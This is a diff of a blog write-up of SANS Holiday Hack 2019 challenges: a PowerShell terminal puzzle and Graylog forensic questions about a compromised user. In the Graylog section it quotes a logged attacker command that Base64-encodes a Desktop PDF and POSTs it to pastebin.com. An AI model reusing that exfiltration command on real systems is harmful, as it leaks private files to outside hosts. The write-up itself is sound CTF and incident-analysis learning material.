 </span></span><span style=display:flex><span>                     system wide. At a command I will reveal my secrets once you Get my 
 </span></span><span style=display:flex><span>                     Child Items.
 </span></span><span style=display:flex><span>ExecutionStatus    : Completed
-</span></span><span style=display:flex><span>StartExecutionTime : 11/29/19 4:57:16 PM
-</span></span><span style=display:flex><span>EndExecutionTime   : 11/29/19 4:57:16 PM
-</span></span><span style=display:flex><span>Duration           : 00:00:00.6090308
+</span></span><span style=display:flex><span>StartExecutionTime : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>57</span>:<span style=color:#2aa198>16</span> PM
+</span></span><span style=display:flex><span>EndExecutionTime   : <span style=color:#2aa198>11</span>/<span style=color:#2aa198>29</span>/<span style=color:#2aa198>19</span> <span style=color:#2aa198>4</span>:<span style=color:#2aa198>57</span>:<span style=color:#2aa198>16</span> PM
+</span></span><span style=display:flex><span>Duration           : <span style=color:#2aa198>00</span>:<span style=color:#2aa198>00</span>:<span style=color:#2aa198>00.6090308</span>
 </span></span></code></pre></div><p>Number 9 points to environmental variables.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>gci </span>env:* | <span style=color:#b58900>sort-object</span> name
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Name                           Value
@@ -430,18 +430,18 @@ Fa la la la la, la la la la
 </span></span><span style=display:flex><span>DOTNET_SYSTEM_GLOBALIZATION_I… false
 </span></span><span style=display:flex><span>HOME                           /home/elf
 </span></span><span style=display:flex><span>HOSTNAME                       b011d5af8027
-</span></span><span style=display:flex><span>LANG                           en_US.UTF-8
-</span></span><span style=display:flex><span>LC_ALL                         en_US.UTF-8
+</span></span><span style=display:flex><span>LANG                           en_US.UTF-<span style=color:#2aa198>8</span>
+</span></span><span style=display:flex><span>LC_ALL                         en_US.UTF-<span style=color:#2aa198>8</span>
 </span></span><span style=display:flex><span>LOGNAME                        elf
 </span></span><span style=display:flex><span>MAIL                           /var/mail/elf
-</span></span><span style=display:flex><span>PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bi…
+</span></span><span style=display:flex><span>PATH                           /opt/microsoft/powershell/<span style=color:#2aa198>6</span>:/usr/local/sbin:/usr/local/bi…
 </span></span><span style=display:flex><span>PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/Mod…
 </span></span><span style=display:flex><span>PSModulePath                   /home/elf/.local/share/powershell/Modules:/root/.local/sh…
 </span></span><span style=display:flex><span><span style=color:#b58900>PWD </span>                           /home/elf
-</span></span><span style=display:flex><span>RESOURCE_ID                    373f8b8e-9767-4f99-866c-6b7bbc879102
+</span></span><span style=display:flex><span>RESOURCE_ID                    373f8b8e-<span style=color:#2aa198>9767</span>-4f99-866c-6b7bbc879102
 </span></span><span style=display:flex><span>riddle                         Squeezed and compressed I am hidden away. Expand me from …
 </span></span><span style=display:flex><span>SHELL                          /home/elf/elf
-</span></span><span style=display:flex><span>SHLVL                          1
+</span></span><span style=display:flex><span>SHLVL                          <span style=color:#2aa198>1</span>
 </span></span><span style=display:flex><span>TERM                           xterm
 </span></span><span style=display:flex><span>USER                           elf
 </span></span><span style=display:flex><span>userdomain                     laserterminal
@@ -454,10 +454,10 @@ Fa la la la la, la la la la
 </span></span><span style=display:flex><span>Value : Squeezed and compressed I am hidden away. Expand me from my prison and I will 
 </span></span><span style=display:flex><span>        show you the way. Recurse through all /etc and <span style=color:#b58900>Sort </span>on my LastWriteTime to 
 </span></span><span style=display:flex><span>        reveal im the newest of all.
-</span></span></code></pre></div><p>Apparently it's <code>archive</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>gci </span>-Path ../../etc/ -Recurse | <span style=color:#b58900>sort </span>LastWriteTime | <span style=color:#b58900>select </span>-last 1
+</span></span></code></pre></div><p>Apparently it's <code>archive</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf&gt; <span style=color:#b58900>gci </span>-Path ../../etc/ -Recurse | <span style=color:#b58900>sort </span>LastWriteTime | <span style=color:#b58900>select </span>-last <span style=color:#2aa198>1</span>
 </span></span><span style=display:flex><span><span style=color:#b58900>gci </span>: Access to the path <span style=color:#2aa198>&#39;/etc/ssl/private&#39;</span> is denied.
-</span></span><span style=display:flex><span>At line:1 char:1
-</span></span><span style=display:flex><span>+ <span style=color:#b58900>gci </span>-Path ../../etc/ -Recurse | <span style=color:#b58900>sort </span>LastWriteTime | <span style=color:#b58900>select </span>-last 1 | ...
+</span></span><span style=display:flex><span>At line:<span style=color:#2aa198>1</span> char:<span style=color:#2aa198>1</span>
+</span></span><span style=display:flex><span>+ <span style=color:#b58900>gci </span>-Path ../../etc/ -Recurse | <span style=color:#b58900>sort </span>LastWriteTime | <span style=color:#b58900>select </span>-last <span style=color:#2aa198>1</span> | ...
 </span></span><span style=display:flex><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 </span></span><span style=display:flex><span>+ CategoryInfo          : PermissionDenied: (/etc/ssl/private:String) [<span style=color:#b58900>Get-ChildItem</span>], UnauthorizedAccessException
 </span></span><span style=display:flex><span>+ FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
@@ -466,7 +466,7 @@ Fa la la la la, la la la la
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
 </span></span><span style=display:flex><span>----                -------------         ------ ----
-</span></span><span style=display:flex><span>--r---          12/12/19  8:41 AM        5662902 archive
+</span></span><span style=display:flex><span>--r---          <span style=color:#2aa198>12</span>/<span style=color:#2aa198>12</span>/<span style=color:#2aa198>19</span>  <span style=color:#2aa198>8</span>:<span style=color:#2aa198>41</span> AM        <span style=color:#2aa198>5662902</span> archive
 </span></span></code></pre></div><p>Let's see what kind of file it is. It looks too big to be a text file.</p><p>We can run <code>Get-Content -TotalCount n</code> on it to the get the first <code>n</code> lines.
 Seems like it's a zip file.</p><pre tabindex=0><code>PS /etc/apt&gt; Expand-Archive -LiteralPath ./archive -DestinationPath /home/elf/
 </code></pre><p>Now we have a directory named <code>refraction</code> inside <code>/home/elf</code>.</p><pre tabindex=0><code>PS /home/elf/refraction&gt; dir
@@ -507,7 +507,7 @@ Path        Property   string Path {get;set;}
 </span></span><span style=display:flex><span>@{Path=/home/elf/depths/produce/thhy5hll.txt; Hash=25520151A320B5B0D21561F92C8F6224}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf/depths&gt; <span style=color:#b58900>gc </span>./produce/thhy5hll.txt
-</span></span><span style=display:flex><span>temperature<span style=color:#719e07>?</span>val=-33.5
+</span></span><span style=display:flex><span>temperature<span style=color:#719e07>?</span>val=<span style=color:#2aa198>-33.5</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>I am one of many thousand similar txt<span style=color:#2aa198>&#39;s contained within the deepest of
 </span></span></span><span style=display:flex><span><span style=color:#2aa198>/home/elf/depths. Finding me will give you the most strength but doing so
@@ -515,8 +515,8 @@ Path        Property   string Path {get;set;}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#b58900>PS </span>/home/elf/depths&gt; <span style=color:#b58900>dir </span>*.txt -Recurse | <span style=color:#b58900>Select-String</span> -Pattern <span style=color:#2aa198>&#34;temperature\?val&#34;</span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>produce/thhy5hll.txt:1:temperature<span style=color:#719e07>?</span>val=-33.5
-</span></span></code></pre></div><p>Another part of the answer: <strong><code>temperature?val=-33.5</code></strong>.</p><p>Not so lucky with <code>dir *.txt -Recurse | Select-String -Pattern "refraction\?val"</code>.</p><p>Does it mean we have get all file names, sort by length and see what happens? Yes.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>gc </span>(<span style=color:#b58900>gci </span>*.txt -Recurse | <span style=color:#b58900>sort </span>{ <span style=color:#268bd2>$_</span>.FullName.length } | <span style=color:#b58900>Select-Object</span> -Last 1)
+</span></span><span style=display:flex><span>produce/thhy5hll.txt:<span style=color:#2aa198>1</span>:temperature<span style=color:#719e07>?</span>val=<span style=color:#2aa198>-33.5</span>
+</span></span></code></pre></div><p>Another part of the answer: <strong><code>temperature?val=-33.5</code></strong>.</p><p>Not so lucky with <code>dir *.txt -Recurse | Select-String -Pattern "refraction\?val"</code>.</p><p>Does it mean we have get all file names, sort by length and see what happens? Yes.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>gc </span>(<span style=color:#b58900>gci </span>*.txt -Recurse | <span style=color:#b58900>sort </span>{ <span style=color:#268bd2>$_</span>.FullName.length } | <span style=color:#b58900>Select-Object</span> -Last <span style=color:#2aa198>1</span>)
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Get <span style=color:#719e07>process</span> information to include Username identification. Stop <span style=color:#719e07>Process</span> to show me you&#39;re skilled and <span style=color:#719e07>in</span> this order they must be killed:
 </span></span><span style=display:flex><span>
@@ -798,10 +798,10 @@ Sincerely,
 <a class=header-link href=#pepper-minstix---graylog><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Actual page that can be opened in the browser:</p><ul><li><a href=https://graylog.elfu.org/ target=_blank rel="noreferrer noopener">https://graylog.elfu.org/</a></li></ul><h2 id=questions>Questions
 <a class=header-link href=#questions><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><h3 id=question-1>Question 1
 <a class=header-link href=#question-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>What is the full-path + filename of the first malicious file downloaded by Minty?</p><ul><li>Answer <code>C:\Users\minty\Downloads\cookie_recipe.exe</code></li></ul><p>Search for <code>recipe</code> and one message pops up.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>CommandLine
-</span></span><span style=display:flex><span>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe <span style=color:#b58900>Invoke-WebRequest</span> -Uri
+</span></span><span style=display:flex><span>C:\Windows\SysWOW64\WindowsPowerShell\v1.<span style=color:#2aa198>0</span>\powershell.exe <span style=color:#b58900>Invoke-WebRequest</span> -Uri
 </span></span><span style=display:flex><span>https://pastebin.com/post.php -Method POST -Body @{ <span style=color:#2aa198>&#34;submit_hidden&#34;</span> =
 </span></span><span style=display:flex><span><span style=color:#2aa198>&#34;submit_hidden&#34;</span>; <span style=color:#2aa198>&#34;paste_code&#34;</span> =
-</span></span><span style=display:flex><span>$(<span style=color:#cb4b16>[Convert]</span>::ToBase64String(<span style=color:#cb4b16>[IO.File]</span>::ReadAllBytes(<span style=color:#2aa198>&#34;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&#34;</span>)));
+</span></span><span style=display:flex><span>$([<span style=color:#cb4b16>Convert</span>]::ToBase64String([<span style=color:#cb4b16>IO.File</span>]::ReadAllBytes(<span style=color:#2aa198>&#34;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&#34;</span>)));
 </span></span><span style=display:flex><span><span style=color:#2aa198>&#34;paste_format&#34;</span> = <span style=color:#2aa198>&#34;1&#34;</span>; <span style=color:#2aa198>&#34;paste_expire_date&#34;</span> = <span style=color:#2aa198>&#34;N&#34;</span>; <span style=color:#2aa198>&#34;paste_private&#34;</span> = <span style=color:#2aa198>&#34;0&#34;</span>;
 </span></span><span style=display:flex><span><span style=color:#2aa198>&#34;paste_name&#34;</span>=<span style=color:#2aa198>&#34;cookie recipe&#34;</span> }
 </span></span></code></pre></div><p><code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></p><p>This is for alabaster and not what we want.</p><p>Searching for <code>minty</code> brings up a lot of results but if we search for it in the
@@ -945,8 +945,8 @@ connections (<code>7660</code>) and goes to a weird IP address (<code>144.202.46
 </code></pre><p>There's nothing in Blacklists (<code>BL Source IPs</code> <code>BL Dest. IPs</code> and <code>BL Hostnames</code>).</p><p>This was our answer <code>192.168.134.130</code>.</p></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
 <time>Jan 15, 2020</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2019-12-22-using-mozilla-rhino-to-run-javascript-in-java/ title="Using Mozilla Rhino to Run JavaScript in Java">Using Mozilla Rhino to Run JavaScript in Java</a>
 <a class="basic-alignment right" href=https://parsiya.net/blog/2020-02-06-documentation-writing-for-system-administrators-notes/ title="Documentation Writing for System Administrators - Notes">Documentation Writing for System Administrators - Notes</a></p><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, an application security engineer.</p><p>I write about application security, cryptography, static analysis, and
-(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
+(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
 <a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
-<a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
 <a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a></li><li><a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a></li><li><a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
 <span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>
